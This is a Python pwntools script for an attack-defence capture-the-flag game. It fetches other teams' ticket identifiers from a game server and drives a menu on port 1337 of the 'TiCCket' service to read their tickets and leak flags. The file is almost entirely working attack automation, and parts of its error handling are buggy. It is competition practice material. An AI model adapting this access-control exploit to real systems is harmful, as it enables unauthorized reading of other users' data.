from pwn import *
import requests
import json

def get_info(team_id):
    service = "TiCCket"
    infos = []
    url = f"http://10.10.0.1:8081/flagIds?service={service}&team={team_id}"
    try:
        r = requests.get(url, timeout=2)
        if r.status_code == 200:
            data = r.json()
            # Navigate into the nested structure
        if service not in data:
            print(f"[!] Servizio '{service}' non trovato in {url}")
            return infos

        team_data = data[service].get(str(team_id), {})
        if not team_data:
            print(f"[!] Nessun dato per il team {team_id} in {url}")
            return infos

        for round_num, entry in team_data.items():
        # Qui si usa 'round_num' come numero del round
            if entry and "ctf_id" in entry and "ticket_id" in entry:
                infos.append({
                    "round": round_num,  # usa la chiave come numero del round
                    "team": team_id,
                    "ctf_id": entry["ctf_id"],
                    "ticket_id": entry["ticket_id"]
                })
            else:
                print(f"[!] Entry senza ctf_id o ticket_id: {entry}")

    except Exception as e:
        print(f"[!] Error on round {round_num}: {e}")
    return infos

def get_info_specific_round(team_id):
    service = "TiCCket"
    infos = []
    url = f"http://10.10.0.1:8081/flagIds?service={service}&team={team_id}"
    try:
        r = requests.get(url, timeout=2)
        if r.status_code == 200:
            data = r.json()
            # Navigate into the nested structure
        if service not in data:
            print(f"[!] Servizio '{service}' non trovato in {url}")
            return infos

        team_data = data[service].get(str(team_id), {})
        if not team_data:
            print(f"[!] Nessun dato per il team {team_id} in {url}")
            return infos

        # Ordinare i round in ordine crescente (utilizzando le chiavi)
        sorted_rounds = sorted(team_data.keys(), key=int)

    # Se ci sono almeno due round, prendiamo il penultimo
        if len(sorted_rounds) >= 2:
            penultimate_round = sorted_rounds[-2]
            entry = team_data[penultimate_round]
            
            if entry and "ctf_id" in entry and "ticket_id" in entry:
                infos.append({
                    "round": penultimate_round,
                    "team": team_id,
                    "ctf_id": entry["ctf_id"],
                    "ticket_id": entry["ticket_id"]
                })
            else:
                print(f"[!] Entry senza ctf_id o ticket_id per il penultimo round {penultimate_round}")

    except Exception as e:
        print(f"[!] Error on round {penultimate_round}: {e}")
    return infos

def exploit(ip, ctf_id, ticket_id):
    flag = ""
    r = remote(ip,1337)
    r.recvuntil(b"Exit", timeout=1)
    r.sendline(b"1")
    r.recvuntil(b"CTF ID:",timeout=1)
    r.sendline(str(ctf_id).encode())
    r.recvuntil(b"):",timeout=1)
    r.sendline(b"dsgfhjgfdsghjkgfd")
    r.recvuntil(b"Exit",timeout=1)
    r.sendline(b"3")
    r.recvuntil(b"Index:",timeout=1)
    r.sendline(str(ticket_id).encode())
    r.recvuntil(b"Exit",timeout=1)
    r.sendline(b"2")
    try:
        r.recvuntil(b"hint: ", timeout=1)
    except TimeoutError:
        print("[!] Timed out waiting for the hint.")
        pass

    try:
        flag=r.recvuntil(b"=", timeout=2)
    except TimeoutError:
        print("[!] Timed out waiting for the hint.")
        pass

    return flag

# Example usage
if __name__ == "__main__":
    team_id = 0 #esempio di attacco
    results = get_info(team_id)
    print(results)
